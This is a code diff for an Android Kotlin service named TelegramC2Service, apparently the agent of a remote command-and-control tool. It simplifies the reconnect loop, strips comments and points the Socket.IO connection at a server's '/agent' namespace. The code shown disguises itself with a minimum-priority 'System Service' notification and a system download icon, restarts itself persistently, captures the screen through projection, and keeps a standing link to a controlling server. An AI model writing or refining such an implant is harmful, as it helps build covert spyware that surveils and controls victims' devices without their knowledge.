@@ -84,11 +84,7 @@ class TelegramC2Service : Service() {
                 initProjectionFromIntent(code, data)
             }
         }
-        // Only start the connect loop if it's not already running
-        if (reconnectJob?.isActive != true) {
-            log("onStartCommand: reconnect loop not running, starting")
-            connectSocket()
-        }
+        if (reconnectJob?.isActive != true) connectSocket()
         return START_STICKY
     }
 
@@ -151,11 +147,9 @@ class TelegramC2Service : Service() {
             .setContentTitle("System Service")
             .setContentText("running")
             .setSmallIcon(android.R.drawable.stat_sys_download)
-            .setPriority(CompatPriorityMin())
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
     }
-
-    private fun CompatPriorityMin(): Int = NotificationCompat.PRIORITY_MIN
 
     // ---------- Socket.IO ----------
 
@@ -169,19 +163,16 @@ class TelegramC2Service : Service() {
                     }
                 }
 
-                // Wait up to 30s for connection
                 var waited = 0
                 while (isActive && !connected && waited < 30000) {
                     delay(500)
                     waited += 500
                 }
 
-                // If connected, idle until disconnect
                 while (isActive && connected) {
                     delay(2000)
                 }
 
-                // If disconnected cleanly, small delay before retry
                 if (isActive && !connected) {
                     delay(3000)
                 }
@@ -191,16 +182,18 @@ class TelegramC2Service : Service() {
 
     private fun doConnect() {
         try {
-            // Close any previous socket first
             try { socket?.off() } catch (_: Exception) {}
             try { socket?.disconnect() } catch (_: Exception) {}
             try { socket?.close() } catch (_: Exception) {}
             socket = null
             connected = false
 
-            val uri = URI(serverUrl)
+            // ⚠️ namespace /agent via URI path
+            val base = serverUrl.trimEnd('/')
+            val uri = URI("$base/agent")
+
             val opts = IO.Options().apply {
-                reconnection = false          // We manage reconnection ourselves
+                reconnection = false
                 timeout = 20000
                 forceNew = true
                 transports = arrayOf("polling", "websocket")
@@ -221,17 +214,13 @@ class TelegramC2Service : Service() {
 
             s.on(Socket.EVENT_CONNECT) {
                 if (connected) return@on
-                log("socket connected")
+                log("socket connected (ns=${s.nsp()})")
                 connected = true
             }
             s.on(Socket.EVENT_DISCONNECT) { args ->
                 val reason = args.firstOrNull()?.toString() ?: "?"
                 log("socket disconnected: $reason")
                 connected = false
-                // schedule reconnection
-                scope.launch {
-                    delay(1000)
-                }
             }
             s.on(Socket.EVENT_CONNECT_ERROR) { args ->
                 val msg = args.firstOrNull()?.toString() ?: "?"
@@ -257,7 +246,7 @@ class TelegramC2Service : Service() {
                 log("agent rejected: ${obj.optString("error")}")
             }
 
-            log("socket connecting to $serverUrl…")
+            log("socket connecting to $uri…")
             s.connect()
         } catch (e: Exception) {
             log("doConnect exception: ${e.message}")
